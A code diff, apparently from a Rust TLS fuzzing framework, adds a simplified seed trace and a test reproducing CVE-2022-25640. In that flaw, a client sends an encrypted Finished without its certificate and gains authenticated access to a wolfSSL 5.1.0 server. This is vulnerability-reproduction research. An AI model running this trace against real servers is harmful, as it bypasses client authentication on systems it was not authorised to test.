@@ -971,7 +971,7 @@ pub fn seed_cve_2022_25638(server: AgentName, server_put: PutDescriptor) -> Trac
     trace
 }
 
-// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640
+/// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640
 pub fn seed_cve_2022_25640(server: AgentName, server_put: PutDescriptor) -> Trace {
     let client_hello = term! {
           fn_client_hello(
@@ -1076,6 +1076,84 @@ pub fn seed_cve_2022_25640(server: AgentName, server_put: PutDescriptor) -> Trac
                             (fn_get_server_key_share(((server, 0)))),
                             fn_no_psk,
                             fn_seq_1  // sequence 1
+                        )
+                    },
+                }),
+            },
+        ],
+    };
+
+    trace
+}
+
+/// A simplified version of [`seed_cve_2022_25640`]
+pub fn seed_cve_2022_25640_simple(server: AgentName, server_put: PutDescriptor) -> Trace {
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_append_cipher_suite(
+                (fn_new_cipher_suites()),
+                fn_cipher_suite13_aes_128_gcm_sha256
+            )),
+            fn_compressions,
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            fn_client_extensions_new,
+                            fn_secp384r1_support_group_extension
+                        )),
+                        fn_signature_algorithm_extension
+                    )),
+                    fn_key_share_deterministic_extension
+                )),
+                fn_supported_versions13_extension
+            ))
+        )
+    };
+
+    let client_finished = term! {
+        fn_finished(
+            (fn_verify_data(
+                (fn_server_finished_transcript(((server, 0)))),
+                (fn_server_hello_transcript(((server, 0)))),
+                (fn_get_server_key_share(((server, 0)))),
+                fn_no_psk
+            ))
+        )
+    };
+
+    let trace = Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor {
+            name: server,
+            tls_version: TLSVersion::V1_3,
+            typ: AgentType::Server,
+            put_descriptor: server_put,
+            client_authentication: true,
+            ..AgentDescriptor::default()
+        }],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @client_hello
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@client_finished),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_seq_0  // sequence 0
                         )
                     },
                 }),
@@ -2322,6 +2400,19 @@ pub mod tests {
     #[cfg_attr(not(feature = "wolfssl510"), should_panic(expected = "OpenSSL"))]
     fn test_seed_cve_2022_25640() {
         let ctx = seed_cve_2022_25640.execute_trace();
+        assert!(ctx.agents_successful());
+    }
+
+    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
+    #[cfg(feature = "client-authentication-transcript-extraction")]
+    #[test]
+    #[cfg_attr(
+        feature = "wolfssl510",
+        should_panic(expected = "Authentication bypass")
+    )]
+    #[cfg_attr(not(feature = "wolfssl510"), should_panic(expected = "OpenSSL"))]
+    fn test_seed_cve_2022_25640_simple() {
+        let ctx = seed_cve_2022_25640_simple.execute_trace();
         assert!(ctx.agents_successful());
     }
 
